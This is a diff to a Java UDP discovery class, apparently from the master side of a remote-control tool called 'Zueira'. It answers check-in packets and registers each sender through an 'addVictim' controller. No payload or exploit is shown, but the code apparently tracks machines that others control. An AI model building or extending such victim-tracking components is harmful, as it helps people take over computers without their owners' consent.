@@ -4,10 +4,14 @@ import java.io.IOException;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
+import java.util.Arrays;
+
+import com.master.zueira.controller.VictimControllerFactory;
 
 public class ZueiraDiscover implements Runnable {
 
-	private static final String ACCEPT_MESSAGE = "Zueira connected in: ";
+	private static final String ACCEPT_MESSAGE = "Zueira connected in:";
+	private static final String RESPONSE_MESSAGE = "Zueira on";
 
 	private static ZueiraDiscover INSTANCE;
 
@@ -43,22 +47,24 @@ public class ZueiraDiscover implements Runnable {
 				final byte[] recvBuf = new byte[15000];
 				final DatagramPacket packet = new DatagramPacket(recvBuf, recvBuf.length);
 				this.socket.receive(packet);
-
-				System.out.println(this.getClass().getName() + ">>>Discovery packet received from: " + packet.getAddress().getHostAddress());
-				System.out.println(this.getClass().getName() + ">>>Packet received; data: " + new String(packet.getData()));
-
-				final String message = new String(packet.getData()).trim();
-				if (message.startsWith(ACCEPT_MESSAGE)) {
-					final byte[] sendData = "DISCOVER_FUIFSERVER_RESPONSE".getBytes();
-
-					final DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, packet.getAddress(), packet.getPort());
-					this.socket.send(sendPacket);
-
-					System.out.println(this.getClass().getName() + ">>>Sent packet to: " + sendPacket.getAddress().getHostAddress());
-				}
+				receive(packet);
 			}
 		} catch (final IOException ex) {
 			ex.printStackTrace();
+		}
+	}
+
+	private void receive(DatagramPacket packet) throws IOException {
+		String address = packet.getAddress().getHostAddress();
+		System.out.println(this.getClass().getName() + ">>>Discovery packet received from: " + address);
+		String message[] = new String(packet.getData()).split("\t");
+		System.out.println(this.getClass().getName() + ">>>Packet received; data: " + Arrays.toString(message));
+		if (message[0].equals(ACCEPT_MESSAGE) && message.length == 3) {
+			final byte[] sendData = RESPONSE_MESSAGE.getBytes();
+			final DatagramPacket sendPacket = new DatagramPacket(sendData, sendData.length, packet.getAddress(), packet.getPort());
+			this.socket.send(sendPacket);
+			VictimControllerFactory.getInstance().getController().addVictim(message[2], address, Integer.valueOf(message[1]));
+			System.out.println(this.getClass().getName() + ">>>Sent packet to: " + sendPacket.getAddress().getHostAddress());
 		}
 	}
 
